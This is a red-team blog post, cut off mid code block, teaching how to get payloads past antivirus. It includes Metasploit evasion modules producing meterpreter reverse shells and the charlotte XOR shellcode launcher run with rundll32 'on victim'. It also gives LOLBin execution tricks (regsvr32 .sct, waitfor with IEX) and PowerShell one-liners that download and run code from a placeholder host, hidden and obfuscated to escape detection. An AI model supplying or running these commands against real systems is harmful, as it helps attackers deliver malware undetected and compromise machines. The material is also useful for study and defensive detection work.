<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Computer, Network, Security">
    <meta name="description" content="a blog on Hexo">
    <meta name="author" content="TyeYeah">
    
    <title>
        
            Bypass Anti-Virus |
        
        Relish the Moment
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/img/wang.svg">
    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                Relish the Moment
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                CATEGORIES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">Bypass Anti-Virus</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/img/aliwangwang.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">TyeYeah</span>
                        
                            <span class="author-label">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2021-08-02 22:20:10</span>
        <span class="mobile">2021-08-02 22:20</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Penetration-Testing/">Penetration Testing</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux/">linux</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/windows/">windows</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/pentest/">pentest</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>2.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>18 Mins</span>
        </span>
    
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <p>Techniques of bypassing antivirus are developing rapidly, and this article shows some practical tools&#x2F;tips.</p>
<h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><p>Actually years age just modifying some special strings or add rubbish paddings at the end makes antivirus confused about the sample, but for now only encryption and obfuscation works, sometimes we even need to explore more native APIs to bypass and this can be still temporary.</p>
<p>What I want to show here is not about detailed information, but some easy-to-use tools which help red teaming. For some hardcore learners, check <a class="link"   target="_blank" rel="noopener" href="https://github.com/Ascotbe/virus/tree/master/ShellCode" >this<i class="fas fa-external-link-alt"></i></a> out.</p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework" >Metasploit<i class="fas fa-external-link-alt"></i></a></h3><p>In <a href="/2020/03/17/2020-03-17-MSF-Pentest-Route/">MSF Pentest Route</a> I introduced pretty much about metasploit framework penetration testing, only to forget the <code>Evasion</code> module which updated in Metasploit 5.0.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show evasion</span><br><span class="line"></span><br><span class="line">Evasion</span><br><span class="line">=======</span><br><span class="line"></span><br><span class="line">   #  Name                                                 Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                                 ---------------  ----    -----  -----------</span><br><span class="line">   0  evasion/windows/applocker_evasion_install_util                        normal  No     Applocker Evasion - .NET Framework Installation Utility</span><br><span class="line">   1  evasion/windows/applocker_evasion_msbuild                             normal  No     Applocker Evasion - MSBuild</span><br><span class="line">   2  evasion/windows/applocker_evasion_presentationhost                    normal  No     Applocker Evasion - Windows Presentation Foundation Host</span><br><span class="line">   3  evasion/windows/applocker_evasion_regasm_regsvcs                      normal  No     Applocker Evasion - Microsoft .NET Assembly Registration Utility</span><br><span class="line">   4  evasion/windows/applocker_evasion_workflow_compiler                   normal  No     Applocker Evasion - Microsoft Workflow Compiler</span><br><span class="line">   5  evasion/windows/process_herpaderping                                  normal  No     Process Herpaderping evasion technique</span><br><span class="line">   6  evasion/windows/windows_defender_exe                                  normal  No     Microsoft Windows Defender Evasive Executable</span><br><span class="line">   7  evasion/windows/windows_defender_js_hta                               normal  No     Microsoft Windows Defender Evasive JS.Net and HTA</span><br></pre></td></tr></table></figure>
<p>Try to use one</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use evasion/windows/windows_defender_exe</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (evasion/windows/windows_defender_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  mikXxir.exe      yes       Filename for the evasive file (default: random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     172.21.180.162   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Evasion target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Microsoft Windows</span><br><span class="line"></span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Compiled executable size: 3584</span><br><span class="line">[+] mikXxir.exe stored at /root/.msf4/local/mikXxir.exe</span><br></pre></td></tr></table></figure>
<p>Then we get a default meterpreter reverse shell at <code>/root/.msf4/local/mikXxir.exe</code></p>
<h3 id="Veil"><a href="#Veil" class="headerlink" title="Veil"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/Veil-Framework/Veil/" >Veil<i class="fas fa-external-link-alt"></i></a></h3><p>As this installation requires <code>wine</code> and part of graph GUI, so remember to install a desktop environment (I’m talking to <code>WSL</code> users).</p>
<p>As for usages, follow the lead in banner and the parameters are similar to <code>msf</code>.</p>
<h3 id="charlotte"><a href="#charlotte" class="headerlink" title="charlotte"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/9emin1/charlotte" >charlotte<i class="fas fa-external-link-alt"></i></a></h3><blockquote>
<p>13&#x2F;05&#x2F;2021:</p>
<ol>
<li>c++ shellcode launcher, fully undetected 0&#x2F;26 as of 13th May 2021.</li>
<li>dynamic invoking of win32 api functions</li>
<li>XOR encryption of shellcode and function names</li>
<li>randomised XOR keys and variables per run</li>
<li>on Kali Linux, simply ‘apt-get install mingw-w64*’ and thats it!</li>
</ol>
</blockquote>
<p>Usage:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/9emin1/charlotte.git &amp;&amp; apt-get install mingw-w64*</span><br><span class="line">$ <span class="built_in">cd</span> charlotte</span><br><span class="line">$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<span class="variable">$YOUR_IP</span> LPORT=<span class="variable">$YOUR_PORT</span> -f raw &gt; beacon.bin</span><br><span class="line">$ python charlotte.py</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># banners</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">[*]                    Initialising charlotte()                    [*]</span><br><span class="line">[*]                    Generating XOR Keys...                      [*]</span><br><span class="line">[*]                    Replacing data <span class="keyword">in</span> template.cpp...           [*]</span><br><span class="line">[*]                    charlotte.cpp generated!                    [*]</span><br><span class="line">[*]                    Completed - Compiling charlotte.dll         [*]</span><br><span class="line">[*]                    Cross Compile Success!                      [*]</span><br><span class="line">[*]                    Removing charlotte.cpp...                   [*]</span><br><span class="line">[*]                    Execute on your Windows x64 victim with:    [*]</span><br><span class="line">[*]                    rundll32 charlotte.dll, ebBpZJRjZOCeIR    [*]</span><br></pre></td></tr></table></figure>
<p>On victim:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; download `charlotte.dll` first (wget, curl, powershell, certutil)</span><br><span class="line">&gt; rundll32 charlotte.dll, ebBpZJRjZOCeIR    <span class="comment"># get it online</span></span><br></pre></td></tr></table></figure>
<p>Finally online and no AV detects.</p>
<h2 id="White-list"><a href="#White-list" class="headerlink" title="White list"></a>White list</h2><p>Includes some LOLBins(Living-Off-the-Land Binaries). These gadgets are always <code>Windows</code> native softwares, with legal digital signs and some acts as components of middleware in <code>Windows</code> </p>
<h3 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h3><p>It executes one command to operate batch of files.<br><code>/p</code> sets folder to search files, <code>/m</code> sets keywords, and <code>/c</code> sets command</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; forfiles /p c:\windows\system32 /m calc.exe /c C:\path\to\payload.exe</span><br></pre></td></tr></table></figure>

<h3 id="pcalua"><a href="#pcalua" class="headerlink" title="pcalua"></a>pcalua</h3><p>A component of Windows Program Compatibility Assistant, <code>-a</code> to execute.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; pcalua.exe <span class="literal">-a</span> C:\path\to\payload.exe</span><br></pre></td></tr></table></figure>

<h3 id="SyncAppvPublishingServer"><a href="#SyncAppvPublishingServer" class="headerlink" title="SyncAppvPublishingServer"></a>SyncAppvPublishingServer</h3><p>It has <code>vbs</code> and <code>exe</code> versions.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; SyncAppvPublishingServer.vbs <span class="string">&quot;n; Start-Process C:\path\to\payload.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>Using <code>regsvr32</code> to execute remote scripts.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; SyncAppvPublishingServer.vbs <span class="string">&quot;Break; regsvr32 /s /n /u /i:http://x.x.x.x:xxxx/xxx.sct scrobj.dll&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Cmd-Hijack"><a href="#Cmd-Hijack" class="headerlink" title="Cmd Hijack"></a>Cmd Hijack</h3><p>Use path traversing to confuse monitoring system</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; cmd.exe /c <span class="string">&quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>Other 2 methods:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; ping ;calc.exe <span class="number">127.0</span>.<span class="number">0.1</span>/../../../../../../../../../../windows/system32/WindowsPowerShell/v1.<span class="number">0</span>/POWERSHELL.EXE</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">cmd.exe /c <span class="string">&quot;ping ;calc.exe; 127.0.0.1/../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/POWERSHELL.EXE&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="conhost-exe"><a href="#conhost-exe" class="headerlink" title="conhost.exe"></a>conhost.exe</h3><p>Console Host Process, the host of console</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; conhost.exe C:\path\to\payload.exe</span><br><span class="line">&gt; conhost <span class="string">&quot;C:\path\to\payload.exe&quot;</span> </span><br><span class="line">&gt; conhost C:/path/to/payload.exe</span><br></pre></td></tr></table></figure>

<h3 id="explorer-exe"><a href="#explorer-exe" class="headerlink" title="explorer.exe"></a>explorer.exe</h3><p>Familiar to it</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; explorer.exe C:/path/to/payload.exe </span><br><span class="line">&gt; explorer.exe /root,<span class="string">&quot;C:/path/to/payload.exe&quot;</span> </span><br><span class="line">&gt; explorer.exe pentestlab.blog, <span class="string">&quot;C:/path/to/payload.exe&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h3><p>Sync pc in internet communication using signals</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; waitfor pentestlab &amp;&amp; PowerShell <span class="built_in">IEX</span> (<span class="built_in">IWR</span> http://x.x.x.x/xxx).Content </span><br><span class="line">&gt; waitfor /s <span class="number">127.0</span>.<span class="number">0.1</span> /<span class="built_in">si</span> pentestlab</span><br></pre></td></tr></table></figure>

<h3 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h3><p>X86</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
<p>X64</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.3031964</span>\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
<h3 id="Regsvcs-exe"><a href="#Regsvcs-exe" class="headerlink" title="Regsvcs.exe"></a>Regsvcs.exe</h3><p>X86</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\regsvcs.exe AllTheThings.dll</span><br></pre></td></tr></table></figure>
<p>X64</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\regsvcs.exe AllTheThings.dll</span><br></pre></td></tr></table></figure>
<h3 id="Regasm-exe"><a href="#Regasm-exe" class="headerlink" title="Regasm.exe"></a>Regasm.exe</h3><p>X86</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\regasm.exe /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
<p>X64</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\regasm.exe /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
<h3 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h3><p>X86</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; regsvr32 /s /u AllTheThings.dll --&gt; Calls DllUnregisterServer</span><br></pre></td></tr></table></figure>
<p>X64</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; regsvr32 /s AllTheThings.dll --&gt; Calls DllRegisterServer</span><br></pre></td></tr></table></figure>
<h3 id="Rundll32-exe"><a href="#Rundll32-exe" class="headerlink" title="Rundll32.exe"></a>Rundll32.exe</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; rundll32 AllTheThings.dll,EntryPoint</span><br></pre></td></tr></table></figure>



<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass <code>UAC</code></h3><p>Check <a class="link"   target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME" >UACME<i class="fas fa-external-link-alt"></i></a> for rich <code>UAC</code> bypassing materials.<br>Under <code>Source</code> folder there are:</p>
<ul>
<li><code>Akagi</code>, x64&#x2F;x86-32 main executable file, contain payload&#x2F;data units.</li>
<li><code>Akatsuki</code>, x64 payload, WOW64 logger.</li>
<li><code>Fubuki</code>, x64&#x2F;x86-32 payload, general purpose.</li>
<li><code>Kamikaze</code>, data, MMC snap-in.</li>
<li><code>Naka</code>, x64&#x2F;x86-32 compressor for other payload&#x2F;data units.</li>
<li><code>Yuubari</code>, x64 UAC info data dumper.</li>
</ul>
<h2 id="Multiple-Programming-Language"><a href="#Multiple-Programming-Language" class="headerlink" title="Multiple Programming Language"></a>Multiple Programming Language</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><code>Powershell</code> has 6 execution policies:</p>
<ol>
<li>Unrestricted:    the highest authority, with no limit on any script execution</li>
<li>Restricted:      default policy, any script execution is not allowed</li>
<li>AllSigned:       all scripts need to be signed before running</li>
<li>RemoteSigned:    no limit for local, but requires signs when from online</li>
<li>Bypass:          without any restrictions</li>
<li>Undefined:       no policy for scripts</li>
</ol>
<p>The default one is <code>Restricted</code> and we can use <code>Get-ExecutionPolicy</code> to get current policy.<br>With <code>Administrator</code> privilege we can use <code>Set-ExecutionPolicy Unrestricted</code> to get highest execution policy, then we are able to run any powershell scripts. To recover, use <code>Set-ExecutionPolicy Restricted</code>.</p>
<p>Now we think about bypass execution policy to run scripts when it is <code>Restricted</code>.</p>
<p>With a file:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="built_in">Get-Content</span> test.ps1 | powershell <span class="literal">-NoProfile</span> -</span><br><span class="line">&gt; powershell <span class="literal">-ExecutionPolicy</span> bypass <span class="operator">-File</span> ./test.ps1</span><br><span class="line">&gt; powershell <span class="literal">-ExecutionPolicy</span> unrestricted <span class="operator">-File</span> ./test.ps1</span><br></pre></td></tr></table></figure>
<p>To be fileless (like scripted web delievery in <code>Cobalt Strike</code>):</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:xxx/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
<p>But these are just bypassing execution policy, what about bypassing AV?</p>
<hr>
<ul>
<li>Command Obfuscation</li>
</ul>
<p>If we run that directly</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:xxx/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
<p>We get caught due to <code>IEX</code> usage (<code>IEX</code> -&gt; Invoke-expression), so get it an alias <code>iii</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="built_in">set-alias</span> <span class="literal">-name</span> iii <span class="literal">-value</span> <span class="built_in">Invoke-Expression</span>;iii(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://x.x.x.x:xxx/a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>Or use <code>echo</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> <span class="built_in">Invoke-Expression</span>(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://x.x.x.x:xxx/a&#x27;</span>) | powershell -</span><br></pre></td></tr></table></figure>
<p>Or use <code>+</code> to split and concat variables</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell  <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object Net.WebClient).&quot;</span>DownloadString<span class="string">&quot;(&#x27;ht&#x27;+&#x27;tp://x.x.x.x:xxx/a&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Code Obfuscation</li>
</ul>
<p>When we run <code>Powershell -ExecutionPolicy Bypass -File ./payload.sp1</code> to execute payload that <code>Cobalt Strike</code> generated, it will be detected by AV.</p>
<p>We can try <code>base64</code> encoding to encode the whole string that this original payload loads to run, and load it by decoding first in new payload. Replace it as:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$base64</span><span class="literal">-decoded</span><span class="literal">-var</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$base64</span><span class="literal">-encoded</span><span class="literal">-string</span>))</span><br></pre></td></tr></table></figure>
<p>And dont forget to change related variable names. Then run <code>Powershell -ExecutionPolicy Bypass -File .\payload.sp1</code> to get it online and bypassing AV.</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation" >Invoke-Obfuscation<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>This is a powershell obfuscation framework on <a class="link"   target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation" >github<i class="fas fa-external-link-alt"></i></a> and often used by APT32.</p>
<p>Load&#x2F;import it and run:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1 </span><br><span class="line">&gt; <span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure>
<p>We can see the banner<br>![Invoke-Obfuscation](&#x2F;imghost&#x2F;bav&#x2F;Invoke-Obfuscation Screenshot.png)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set target first</span></span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>\Encoding&gt; <span class="built_in">SET</span> SCRIPTPATH <span class="built_in">Invoke-Obfuscation</span>/<span class="built_in">Out-SecureStringCommand</span>.ps1</span><br><span class="line"></span><br><span class="line">Successfully <span class="built_in">set</span> ScriptPath:</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>/<span class="built_in">Out-SecureStringCommand</span>.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>&gt; encoding</span><br><span class="line"></span><br><span class="line">Choose one of the below Encoding options to APPLY to current payload:</span><br><span class="line"></span><br><span class="line">[*] ENCODING\<span class="number">1</span>          Encode entire command as ASCII</span><br><span class="line">[*] ENCODING\<span class="number">2</span>          Encode entire command as Hex</span><br><span class="line">[*] ENCODING\<span class="number">3</span>          Encode entire command as Octal</span><br><span class="line">[*] ENCODING\<span class="number">4</span>          Encode entire command as Binary</span><br><span class="line">[*] ENCODING\<span class="number">5</span>          Encrypt entire command as SecureString (AES)</span><br><span class="line">[*] ENCODING\<span class="number">6</span>          Encode entire command as BXOR</span><br><span class="line">[*] ENCODING\<span class="number">7</span>          Encode entire command as Special Characters</span><br><span class="line">[*] ENCODING\<span class="number">8</span>          Encode entire command as Whitespace</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>\Encoding&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Executed:</span><br><span class="line">  <span class="built_in">CLI</span>:  Encoding\<span class="number">1</span></span><br><span class="line">  FULL: <span class="built_in">Out-EncodedAsciiCommand</span> <span class="literal">-ScriptBlock</span> <span 